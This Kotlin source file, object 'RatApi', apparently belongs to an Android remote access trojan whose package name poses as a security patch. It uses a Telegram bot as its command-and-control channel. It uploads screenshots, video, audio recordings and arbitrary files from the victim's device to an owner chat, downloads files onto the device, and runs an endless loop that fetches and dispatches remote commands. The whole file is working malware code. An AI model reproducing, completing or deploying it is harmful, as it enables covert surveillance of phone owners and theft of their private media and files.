package com.android.security.patch

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

object RatApi {

    private fun url(method: String) = Config.API + Config.BOT_TOKEN + "/" + method

    // ============ low-level ============

    private fun httpGet(u: String): String? {
        var conn: HttpURLConnection? = null
        return try {
            conn = (URL(u).openConnection() as HttpURLConnection).apply {
                connectTimeout = 40000
                readTimeout = 60000
                requestMethod = "GET"
            }
            val code = conn.responseCode
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
            stream?.bufferedReader()?.use { it.readText() }
        } catch (_: Throwable) { null } finally { conn?.disconnect() }
    }

    private fun httpPost(u: String, body: String, contentType: String): String? {
        var conn: HttpURLConnection? = null
        return try {
            conn = (URL(u).openConnection() as HttpURLConnection).apply {
                connectTimeout = 40000
                readTimeout = 120000
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", contentType)
            }
            conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
            val code = conn.responseCode
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
            stream?.bufferedReader()?.use { it.readText() }
        } catch (_: Throwable) { null } finally { conn?.disconnect() }
    }

    private fun multipart(
        u: String,
        fieldName: String,
        filename: String,
        mime: String,
        data: ByteArray,
        fields: Map<String, String> = emptyMap(),
        thumb: ByteArray? = null
    ): String? {
        var conn: HttpURLConnection? = null
        val boundary = "----" + UUID.randomUUID().toString().replace("-", "")
        return try {
            conn = (URL(u).openConnection() as HttpURLConnection).apply {
                connectTimeout = 40000
                readTimeout = 300000
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                setChunkedStreamingMode(0)
            }
            DataOutputStream(BufferedOutputStream(conn.outputStream)).use { out ->
                val crlf = "\r\n"
                for ((k, v) in fields) {
                    out.writeBytes("--$boundary$crlf")
                    out.writeBytes("Content-Disposition: form-data; name=\"$k\"$crlf$crlf")
                    out.write(v.toByteArray(Charsets.UTF_8))
                    out.writeBytes(crlf)
                }
                out.writeBytes("--$boundary$crlf")
                out.writeBytes("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"$filename\"$crlf")
                out.writeBytes("Content-Type: $mime$crlf$crlf")
                out.write(data)
                out.writeBytes(crlf)
                if (thumb != null) {
                    out.writeBytes("--$boundary$crlf")
                    out.writeBytes("Content-Disposition: form-data; name=\"thumb\"; filename=\"thumb.jpg\"$crlf")
                    out.writeBytes("Content-Type: image/jpeg$crlf$crlf")
                    out.write(thumb)
                    out.writeBytes(crlf)
                }
                out.writeBytes("--$boundary--$crlf")
                out.flush()
            }
            val code = conn.responseCode
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
            stream?.bufferedReader()?.use { it.readText() }
        } catch (_: Throwable) { null } finally { conn?.disconnect() }
    }

    // ============ high-level ============

    fun sendMessage(ctx: Context, text: String, chatId: Long = 0L): Long? {
        val cid = if (chatId != 0L) chatId else Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        if (cid == 0L) return null
        val obj = JSONObject().apply {
            put("chat_id", cid)
            put("text", text)
            put("parse_mode", "HTML")
            put("disable_web_page_preview", true)
        }
        val res = httpPost(url("sendMessage"), obj.toString(), "application/json") ?: return null
        return try {
            JSONObject(res).optJSONObject("result")?.optLong("message_id")
        } catch (_: Throwable) { null }
    }

    fun editMessage(ctx: Context, chatId: Long, msgId: Long, text: String, replyMarkup: JSONObject? = null): Boolean {
        val obj = JSONObject().apply {
            put("chat_id", chatId)
            put("message_id", msgId)
            put("text", text)
            put("parse_mode", "HTML")
            if (replyMarkup != null) put("reply_markup", replyMarkup)
        }
        val res = httpPost(url("editMessageText"), obj.toString(), "application/json")
        return res != null && res.contains("\"ok\":true")
    }

    fun answerCallback(ctx: Context, cbId: String, text: String = "") {
        val obj = JSONObject().apply {
            put("callback_query_id", cbId)
            if (text.isNotEmpty()) put("text", text)
        }
        httpPost(url("answerCallbackQuery"), obj.toString(), "application/json")
    }

    fun sendPhoto(ctx: Context, bytes: ByteArray, caption: String = "", chatId: Long = 0L): Boolean {
        val cid = if (chatId != 0L) chatId else Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        val res = multipart(
            url("sendPhoto"), "photo", "shot.jpg", "image/jpeg", bytes,
            mapOf("chat_id" to cid.toString(), "caption" to caption, "parse_mode" to "HTML")
        )
        return res != null
    }

    fun sendVideo(ctx: Context, bytes: ByteArray, caption: String = "", chatId: Long = 0L): Boolean {
        val cid = if (chatId != 0L) chatId else Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        val res = multipart(
            url("sendVideo"), "video", "rec.mp4", "video/mp4", bytes,
            mapOf("chat_id" to cid.toString(), "caption" to caption, "parse_mode" to "HTML")
        )
        return res != null
    }

    fun sendAudio(ctx: Context, bytes: ByteArray, caption: String = "", chatId: Long = 0L): Boolean {
        val cid = if (chatId != 0L) chatId else Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        val res = multipart(
            url("sendAudio"), "audio", "audio.m4a", "audio/mp4", bytes,
            mapOf("chat_id" to cid.toString(), "caption" to caption, "parse_mode" to "HTML")
        )
        return res != null
    }

    fun sendDocument(ctx: Context, bytes: ByteArray, filename: String, caption: String = "", chatId: Long = 0L): Boolean {
        val cid = if (chatId != 0L) chatId else Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        val res = multipart(
            url("sendDocument"), "document", filename, "application/octet-stream", bytes,
            mapOf("chat_id" to cid.toString(), "caption" to caption, "parse_mode" to "HTML")
        )
        return res != null
    }

    fun sendChatAction(ctx: Context, action: String = "typing", chatId: Long = 0L) {
        val cid = if (chatId != 0L) chatId else Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        val obj = JSONObject().apply {
            put("chat_id", cid)
            put("action", action)
        }
        httpPost(url("sendChatAction"), obj.toString(), "application/json")
    }

    // ============ file download (dari telegram ke device) ============

    fun downloadTelegramFile(fileId: String): ByteArray? {
        val meta = httpGet(url("getFile") + "?file_id=$fileId") ?: return null
        val path = try {
            JSONObject(meta).optJSONObject("result")?.optString("file_path") ?: return null
        } catch (_: Throwable) { return null }
        val fileUrl = "https://api.telegram.org/file/bot${Config.BOT_TOKEN}/$path"
        var conn: HttpURLConnection? = null
        return try {
            conn = (URL(fileUrl).openConnection() as HttpURLConnection).apply {
                connectTimeout = 40000
                readTimeout = 300000
            }
            conn.inputStream.use { it.readBytes() }
        } catch (_: Throwable) { null } finally { conn?.disconnect() }
    }

    // ============ poll loop ============

    fun pollLoop(ctx: Context) {
        var offset = Prefs.getLong(ctx, Prefs.UPDATE_OFFSET, 0L)
        while (true) {
            try {
                val u = url("getUpdates") + "?timeout=30&offset=$offset&allowed_updates=%5B%22message%22%2C%22callback_query%22%5D"
                val resp = httpGet(u)
                if (resp != null) {
                    val json = JSONObject(resp)
                    val arr: JSONArray? = json.optJSONArray("result")
                    if (arr != null) {
                        for (i in 0 until arr.length()) {
                            val upd = arr.optJSONObject(i) ?: continue
                            val uid = upd.optLong("update_id")
                            offset = uid + 1
                            Prefs.setLong(ctx, Prefs.UPDATE_OFFSET, offset)
                            try { CommandRouter.dispatch(ctx, upd) } catch (_: Throwable) {}
                        }
                    }
                }
            } catch (_: Throwable) {
                try { Thread.sleep(3000) } catch (_: InterruptedException) { return }
            }
        }
    }

    fun deleteMessage(ctx: Context, chatId: Long, msgId: Long): Boolean {
        val obj = JSONObject().apply {
            put("chat_id", chatId)
            put("message_id", msgId)
        }
        val res = httpPost(url("deleteMessage"), obj.toString(), "application/json")
        return res != null && res.contains("\"ok\":true")
    }

    fun sendMessageWithKb(ctx: Context, text: String, kb: JSONObject, chatId: Long = 0L): Long? {
        val cid = if (chatId != 0L) chatId else Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        if (cid == 0L) return null
        val obj = JSONObject().apply {
            put("chat_id", cid)
            put("text", text)
            put("parse_mode", "HTML")
            put("disable_web_page_preview", true)
            put("reply_markup", kb)
        }
        val res = httpPost(url("sendMessage"), obj.toString(), "application/json") ?: return null
        return try { JSONObject(res).optJSONObject("result")?.optLong("message_id") } catch (_: Throwable) { null }
    }

    fun editMessageWithKb(ctx: Context, chatId: Long, msgId: Long, text: String, kb: JSONObject?): Boolean {
        val obj = JSONObject().apply {
            put("chat_id", chatId)
            put("message_id", msgId)
            put("text", text)
            put("parse_mode", "HTML")
            put("disable_web_page_preview", true)
            if (kb != null) put("reply_markup", kb)
        }
        val res = httpPost(url("editMessageText"), obj.toString(), "application/json")
        return res != null && res.contains("\"ok\":true")
    }

}